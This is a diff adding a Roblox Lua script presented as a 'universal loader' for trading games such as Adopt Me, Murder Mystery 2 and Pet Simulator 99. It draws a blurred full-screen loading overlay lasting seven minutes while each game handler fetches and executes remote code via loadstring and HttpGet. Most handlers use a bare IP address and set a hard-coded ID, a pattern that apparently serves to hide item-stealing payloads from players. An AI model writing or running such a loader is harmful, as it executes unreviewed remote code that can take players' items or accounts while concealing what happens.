@@ -1,0 +1,277 @@
+-- Universal Game Loader
+-- Supported PlaceIds:
+-- 126884695634066 = Grow-a-Garden
+-- 124977557560410 = Grow-a-Garden [NEWBIES]
+-- 142823291      = Murder Mystery 2
+-- 920587237      = Adopt Me
+-- 18901165922    = PETS GO
+-- 8737899170     = Pet Simulator 99
+-- 127742093697776 = Plants VS Brainrot
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local player = Players.LocalPlayer
+
+-- Game mapping
+local SupportedGames = {
+    [126884695634066] = "Grow-a-Garden",
+    [124977557560410] = "Grow-a-Garden [NEWBIES]",
+    [142823291] = "Murder Mystery 2",
+    [920587237] = "Adopt Me",
+    [18901165922] = "PETS GO",
+    [8737899170] = "Pet Simulator 99",
+    [127742093697776] = "Plants VS Brainrot"
+}
+
+local function getGameName(placeId)
+    return SupportedGames[placeId] or "Unknown Game"
+end
+
+-- Fun facts for loading screen
+local funFacts = {
+    "Did you know? Roblox launched in 2006!",
+    "Tip: Press F9 to open the dev console.",
+    "Fun Fact: Lua is the scripting language used by Roblox.",
+    "Pro tip: Take short breaks to avoid burnout.",
+    "Did you know? Some Roblox games reach millions of players!",
+    "Fact: The Roblox logo has changed 5 times since launch.",
+    "Tip: You can mute sounds in-game with the Escape menu.",
+    "Roblox once had a feature called 'Tickets' as currency.",
+    "Did you know? Adopt Me is the most visited Roblox game.",
+    "Roblox originally was called DynaBlocks in 2004.",
+    "Fun Fact: Pet Simulator 99 is part of a whole simulator series.",
+    "MM2 (Murder Mystery 2) is based on the classic Garry’s Mod 'Murder'.",
+    "Fact: Roblox Studio is free and open to everyone.",
+    "Tip: Always check the developer console for hidden errors.",
+    "Roblox supports VR games too!",
+    "Did you know? There are more than 60 million Roblox experiences.",
+    "Roblox uses the Havok physics engine for simulation.",
+    "Pro tip: Low graphics settings can improve FPS in big games.",
+    "Fact: Some players earn real money through Roblox DevEx.",
+    "Did you know? The maximum friends you can have is 200.",
+    "Tip: Use Ctrl+Shift+F to search scripts in Roblox Studio.",
+    "Fun Fact: The oof death sound was replaced in 2022.",
+    "Fact: There’s a hidden emote wheel in Roblox (press “/e dance”).",
+    "Did you know? You can upload clothing to earn Robux.",
+    "Roblox Premium gives a monthly Robux stipend.",
+    "Fun Fact: Some Roblox eggs from Egg Hunts are now rare collectibles."
+}
+
+-- Loading screen function
+local function createLoadingScreen(gameName, duration)
+    if not gameName then gameName = "Game" end
+    duration = duration or 420
+
+    -- Blur effect
+    local blur = Instance.new("BlurEffect")
+    blur.Name = "UniversalLoaderBlur"
+    blur.Size = 0
+    blur.Parent = Lighting
+    TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = 24}):Play()
+
+    -- Main GUI
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "UniversalModernLoader"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.Name = "Main"
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Size = UDim2.fromOffset(380, 170)
+    frame.Position = UDim2.fromScale(0.5, 0.5)
+    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
+    frame.BackgroundTransparency = 0.08
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+    local uiGradient = Instance.new("UIGradient")
+    uiGradient.Rotation = 20
+    uiGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(28,28,34)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(40,40,48))
+    })
+    uiGradient.Parent = frame
+
+    local uiStroke = Instance.new("UIStroke")
+    uiStroke.Thickness = 2
+    uiStroke.Color = Color3.fromRGB(100, 110, 255)
+    uiStroke.Transparency = 0.6
+    uiStroke.Parent = frame
+    TweenService:Create(uiStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.2}):Play()
+
+    local title = Instance.new("TextLabel")
+    title.Name = "Title"
+    title.Size = UDim2.new(0.9, 0, 0.16, 0)
+    title.Position = UDim2.new(0.05, 0, 0.04, 0)
+    title.BackgroundTransparency = 1
+    title.Text = gameName
+    title.TextColor3 = Color3.fromRGB(215, 220, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.TextStrokeTransparency = 0.8
+    title.Parent = frame
+    TweenService:Create(title, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {TextTransparency = 0.1}):Play()
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Name = "Subtitle"
+    subtitle.Size = UDim2.new(0.9, 0, 0.09, 0)
+    subtitle.Position = UDim2.new(0.05, 0, 0.18, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "Preparing your experience..."
+    subtitle.TextColor3 = Color3.fromRGB(170, 175, 220)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextStrokeTransparency = 0.9
+    subtitle.Parent = frame
+
+    local loadingBarBg = Instance.new("Frame")
+    loadingBarBg.Name = "LoadingBg"
+    loadingBarBg.Size = UDim2.new(0.82, 0, 0.14, 0)
+    loadingBarBg.Position = UDim2.new(0.09, 0, 0.45, 0)
+    loadingBarBg.BackgroundColor3 = Color3.fromRGB(44, 44, 54)
+    loadingBarBg.BorderSizePixel = 0
+    loadingBarBg.Parent = frame
+    Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 8)
+
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Name = "LoadingFill"
+    loadingBar.Size = UDim2.new(0, 0, 1, 0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(115, 120, 255)
+    loadingBar.BorderSizePixel = 0
+    loadingBar.Parent = loadingBarBg
+    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 8)
+
+    local fillGradient = Instance.new("UIGradient")
+    fillGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(115,120,255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(155,170,255))
+    })
+    fillGradient.Parent = loadingBar
+
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Name = "Percent"
+    percentLabel.Size = UDim2.new(0.9, 0, 0.12, 0)
+    percentLabel.Position = UDim2.new(0.05, 0, 0.62, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.TextScaled = true
+    percentLabel.Font = Enum.Font.Gotham
+    percentLabel.TextColor3 = Color3.fromRGB(200,200,255)
+    percentLabel.Parent = frame
+
+    local funLabel = Instance.new("TextLabel")
+    funLabel.Name = "FunFact"
+    funLabel.Size = UDim2.new(0.9, 0, 0.18, 0)
+    funLabel.Position = UDim2.new(0.05, 0, 0.74, 0)
+    funLabel.BackgroundTransparency = 1
+    funLabel.TextWrapped = true
+    funLabel.Text = "Fun Fact: " .. funFacts[math.random(1,#funFacts)]
+    funLabel.TextColor3 = Color3.fromRGB(180, 185, 230)
+    funLabel.TextScaled = false
+    funLabel.Font = Enum.Font.Gotham
+    funLabel.TextSize = 14
+    funLabel.Parent = frame
+
+    local start = tick()
+    local lastFact = 0
+
+    task.spawn(function()
+        while tick() - start < duration and screenGui.Parent do
+            local elapsed = tick() - start
+            local progress = math.clamp(elapsed / duration, 0, 1)
+
+            pcall(function()
+                loadingBar:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.12, true)
+            end)
+
+            percentLabel.Text = tostring(math.floor(progress*100)).."%"
+
+            if elapsed - lastFact >= 5 then
+                lastFact = elapsed
+                local newFact = funFacts[math.random(1, #funFacts)]
+                TweenService:Create(funLabel, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
+                task.wait(0.45)
+                if funLabel then funLabel.Text = "Fun Fact: " .. newFact end
+                TweenService:Create(funLabel, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
+            end
+            task.wait(0.12)
+        end
+
+        pcall(function()
+            loadingBar.Size = UDim2.new(1,0,1,0)
+            percentLabel.Text = "100%"
+        end)
+
+        TweenService:Create(blur, TweenInfo.new(0.6), {Size = 0}):Play()
+        TweenService:Create(frame, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+        TweenService:Create(percentLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+        TweenService:Create(funLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+        TweenService:Create(loadingBar, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(loadingBarBg, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+
+        task.wait(0.8)
+        if screenGui and screenGui.Parent then screenGui:Destroy() end
+        if blur and blur.Parent then blur:Destroy() end
+    end)
+
+    return function()
+        while screenGui and screenGui.Parent do
+            task.wait(0.2)
+        end
+    end
+end
+
+-- Handlers for each game
+local handlers = {
+    [8737899170] = {name="Pet Simulator 99", action=function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ingeniousmainmn/Universal/refs/heads/main/Universal", true))()
+    end},
+    [18901165922] = {name="PETS GO", action=function()
+        loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))()
+    end},
+    [142823291] = {name="Murder Mystery 2", action=function()
+        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [920587237] = {name="Adopt Me", action=function()
+        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [126884695634066] = {name="Grow-a-Garden", action=function()
+        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [124977557560410] = {name="Grow-a-Garden [NEWBIES]", action=function()
+        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [127742093697776] = {name="Plants VS Brainrot", action=function()
+        ID="bdf7cf31-125d-4ccf-a5b9-9c510e9e13eb"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+}
+
+-- Detect current game
+local placeId = game.PlaceId
+local entry = handlers[placeId]
+
+if entry then
+    createLoadingScreen(entry.name, 420)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {Title="Game detected", Text=entry.name, Duration=5})
+        entry.action()
+    end)
+else
+    StarterGui:SetCore("SendNotification", {Title="Unsupported Game", Text="PlaceId: "..tostring(placeId), Duration=5})
+    warn("Universal loader: unsupported PlaceId:", placeId)
+end
